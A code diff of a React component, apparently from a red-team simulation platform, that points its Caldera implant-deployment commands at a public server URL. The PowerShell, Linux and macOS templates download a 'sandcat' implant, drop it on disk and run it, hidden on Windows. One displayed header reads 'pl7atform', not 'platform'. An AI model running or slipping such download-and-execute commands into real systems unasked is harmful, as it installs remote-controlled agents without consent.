@@ -98,7 +98,7 @@ const Injectors = () => {
         return {
           icon: <Powershell />,
           label: 'powershell',
-          displayedCode: `$server="${settings.caldera_url}";
+          displayedCode: `$server="${settings.caldera_public_url}";
 $url="$server/file/download";
 $wc=New-Object System.Net.WebClient;
 $wc.Headers.add("pl7atform","windows");
@@ -108,37 +108,37 @@ get-process | ? {$_.modules.filename -like "C:\\Users\\Public\\${implantName}.ex
 rm -force "C:\\Users\\Public\\${implantName}.exe" -ea ignore;
 [io.file]::WriteAllBytes("C:\\Users\\Public\\${implantName}.exe",$data) | Out-Null;
 Start-Process -FilePath C:\\Users\\Public\\${implantName}.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;`,
-          code: `$server="${settings.caldera_url}";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\\Users\\Public\\${implantName}.exe"} | stop-process -f;rm -force "C:\\Users\\Public\\${implantName}.exe" -ea ignore;[io.file]::WriteAllBytes("C:\\Users\\Public\\${implantName}.exe",$data) | Out-Null;Start-Process -FilePath C:\\Users\\Public\\${implantName}.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;`,
+          code: `$server="${settings.caldera_public_url}";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\\Users\\Public\\${implantName}.exe"} | stop-process -f;rm -force "C:\\Users\\Public\\${implantName}.exe" -ea ignore;[io.file]::WriteAllBytes("C:\\Users\\Public\\${implantName}.exe",$data) | Out-Null;Start-Process -FilePath C:\\Users\\Public\\${implantName}.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;`,
         };
       case 'linux':
         return {
           icon: <Bash />,
           label: 'sh',
-          displayedCode: `server="${settings.caldera_url}";
+          displayedCode: `server="${settings.caldera_public_url}";
 curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > ${implantName};
 chmod +x ${implantName};
 ./${implantName} -server $server -group red -v`,
-          code: `server="${settings.caldera_url}";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > ${implantName};chmod +x ${implantName};./${implantName} -server $server -group red -v`,
+          code: `server="${settings.caldera_public_url}";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > ${implantName};chmod +x ${implantName};./${implantName} -server $server -group red -v`,
         };
       case 'macos':
         return {
           icon: <TerminalOutlined />,
           label: 'sh',
-          displayedCode: `server="${settings.caldera_url}";
+          displayedCode: `server="${settings.caldera_public_url}";
 curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download > ${implantName};
 chmod +x ${implantName};
 ./${implantName} -server $server -v`,
-          code: `server="${settings.caldera_url}";curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download > ${implantName};chmod +x ${implantName};./${implantName} -server $server -v`,
+          code: `server="${settings.caldera_public_url}";curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download > ${implantName};chmod +x ${implantName};./${implantName} -server $server -v`,
         };
       default:
         return {
           icon: <TerminalOutlined />,
           label: 'sh',
-          displayedCode: `server="${settings.caldera_url}";
+          displayedCode: `server="${settings.caldera_public_url}";
 curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > ${implantName};
 chmod +x ${implantName};
 ./${implantName} -server $server -group red -v`,
-          code: `server="${settings.caldera_url}";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > ${implantName};chmod +x ${implantName};./${implantName} -server $server -group red -v`,
+          code: `server="${settings.caldera_public_url}";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > ${implantName};chmod +x ${implantName};./${implantName} -server $server -group red -v`,
         };
     }
   };
